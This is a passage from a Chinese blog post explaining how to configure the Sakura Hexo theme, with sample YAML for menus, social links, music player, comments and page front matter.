fa: fa-list-ul faa-vertical, submenus: &#123; 书单: &#123;path: /tags/悦读/, fa: fa-th-list faa-bounce &#125;, 番组: &#123;path: /bangumi/, fa: fa-film faa-vertical &#125;, 歌单: &#123;path: /music/, fa: fa-headphones &#125;, 图集: &#123;path: /tags/图集/, fa: fa-photo &#125; &#125; &#125; 留言板: &#123; path: /comment/, fa: fa-pencil-square-o faa-tada &#125; 友人帐: &#123; path: /links/, fa: fa-link faa-shake &#125; 赞赏: &#123; path: /donate/, fa: fa-heart faa-pulse &#125; 关于: &#123; path: /, fa: fa-leaf faa-wrench , submenus: &#123; 我？: &#123;path: /about/, fa: fa-meetup&#125;, 主题: &#123;path: /theme-sakura/, fa: iconfont icon-sakura &#125;, Lab: &#123;path: /lab/, fa: fa-cogs &#125;, &#125; &#125; 客户端: &#123; path: /client/, fa: fa-android faa-vertical &#125; RSS: &#123; path: /atom.xml, fa: fa-rss faa-pulse &#125; # Home page sort type: -1: newer first，1: older first. 【非】 homePageSortType: -1 # Home page article shown number) 【非】 homeArticleShown: 10 # 背景图片 【选】 bgn: 8 # startdash面板 url, title, desc img 【改】 startdash: - &#123;url: /theme-sakura/, title: Sakura, desc: 本站 hexo 主题, img: /img/startdash/sakura.md.png&#125; - &#123;url: http://space.bilibili.com/271849279, title: Bilibili, desc: 博主的b站视频, img: /img/startdash/bilibili.jpg&#125; - &#123;url: /, title: hojun的万事屋, desc: 技术服务, img: /img/startdash/wangshiwu.jpg&#125; # your site build time or founded date # 你的站点建立日期 【改】 siteBuildingTime: 07/17/2018 # 社交按钮(social) url, img PC端配置 【改】 social: github: &#123;url: http://github.com/honjun, img: /img/social/github.png&#125; sina: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/sina.png&#125; wangyiyun: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/wangyiyun.png&#125; zhihu: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/zhihu.png&#125; email: &#123;url: http://weibo.com/mashirozx?is_all=1, img: /img/social/email.svg&#125; wechat: &#123;url: /#, qrcode: /img/custom/wechat.jpg, img: /img/social/wechat.png&#125; # 社交按钮(msocial) url, img 移动端配置 【改】 msocial: github: &#123;url: http://github.com/honjun, fa: fa-github, color: 333&#125; weibo: &#123;url: http://weibo.com/mashirozx?is_all=1, fa: fa-weibo, color: dd4b39&#125; qq: &#123;url: https://wpa.qq.com/msgrd?v=3&amp;uin=954655431&amp;site=qq&amp;menu=yes, fa: fa-qq, color: 25c6fe&#125; # 赞赏二维码（其中wechatSQ是赞赏单页面的赞赏码图片）【改】 donate: alipay: /img/custom/donate/AliPayQR.jpg wechat: /img/custom/donate/WeChanQR.jpg wechatSQ: /img/custom/donate/WeChanSQ.jpg # 首页视频地址为https://cdn.jsdelivr.net/gh/honjun/hojun@1.2/Unbroken.mp4，配置如下 【改】 movies: url: https://cdn.jsdelivr.net/gh/honjun/hojun@1.2 # 多个视频用逗号隔开，随机获取。支持的格式目前已知MP4,Flv。其他的可以试下，不保证有用 name: Unbroken.mp4 # 左下角aplayer播放器配置 主要改id和server这两项，修改详见[aplayer文档] 【改】 aplayer: id: 2660651585 server: netease type: playlist fixed: true mini: false autoplay: false loop: all order: random preload: auto volume: 0.7 mutex: true # Valine评论配置【改】 valine: true v_appId: GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz v_appKey: mgOpfzbkHYqU92CV4IDlAUHQ 分类页和标签页配置分类页 标签页 配置项在\\themes\\Sakura\\languages\\zh-cn.yml里。新增一个分类或标签最好加下哦，当然嫌麻烦可以直接使用一张默认图片（可以改主题或者直接把404图片替换下，征求下意见要不要给这个在配置文件中加个开关，可以issue或群里提出来），现在是没设置的话会使用那种倒立小狗404哦。 #category # 按分类名创建 技术: #中文标题 zh: 野生技术协会 # 英文标题 en: Geek – Only for Love # 封面图片 img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/coding.jpg 生活: zh: 生活 en: live img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/writing.jpg #tag # 标签名即是标题 悦读: # 封面图片 img: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/banner/reading.jpg 单页面封面配置如留言板页面页面，位于source下的comment下，打开index.md如下： --- title: comment date: 2018-12-20 23:13:48 keywords: 留言板 description: comments: true # 在这里配置单页面头部图片，自定义替换哦~ photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/comment.jpg --- 单页面配置番组计划页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响） --- layout: bangumi title: bangumi comments: false date: 2019-02-10 21:32:48 keywords: description: bangumis: # 番组图片 - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg # 番组名 title: 朝花夕誓——于离别之朝束起约定之花 # 追番状态 （追番ing/已追完） status: 已追完 # 追番进度 progress: 100 # 番剧日文名称 jp: さよならの朝に約束の花をかざろう # 放送时间 time: 放送时间: 2018-02-24 SUN. # 番剧介绍 desc: 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。 - img: https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg title: 朝花夕誓——于离别之朝束起约定之花 status: 已追完 progress: 50 jp: さよならの朝に約束の花をかざろう time: 放送时间: 2018-02-24 SUN. desc: 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。 --- 友链页 （请直接在下载后的文件中改，下面的添加了注释可能会有些影响） --- layout: links title: links # 创建日期，可以改下 date: 2018-12-19 23:11:06 # 图片上的标题，自定义修改 keywords: 友人帐 description: # true/false 开启/关闭评论 comments: true # 页面头部图片，自定义修改 photos: https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/links.jpg # 友链配置 links: # 类型分组 - group: 个人项目 # 类型简介 desc: 充分说明这家伙是条咸鱼 &lt; (￣︶￣)&gt; items: # 友链链接 - url: https://shino.cc/fgvf # 友链头像 img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg # 友链站点名 name: Google # 友链介绍 下面雷同 desc: Google 镜像 - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像 # 类型分组... - group: 小伙伴们 desc: 欢迎交换友链 ꉂ(ˊᗜˋ) items: - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像 - url: https://shino.cc/fgvf img: https://cloud.moezx.cc/Picture/svg/landscape/fields.svg name: Google desc: Google 镜像 --- 写文章配置主题集成了个人插件hexo-tag-bili和hexo-tag-fancybox_img。其中hexo-tag-bili用来在文章或单页面中插入B站外链视频，使用语法如下： &#123;% bili video_id [page] %&#125; 详细使用教程详见hexo-tag-bili。 hexo-tag-fancybox_img用来在文章或单页面中图片，使用语法如下： &#123;% fb_img src [caption] %&#125; 详细使用教程详见hexo-tag-fancybox_img 还有啥，一时想不起来……To be continued…","categories":[{"name":"技术","slug":"技术","permalink":"https://pipimi110.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pipimi110.github.io/tags/web/"},{"name":"悦读","slug":"悦读","permalink":"https://pipimi110.github.io/tags/%E6%82%A6%E8%AF%BB/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pipimi110.github.io/categories/%E6%8A%80%E6%9C%AF/"}]}]}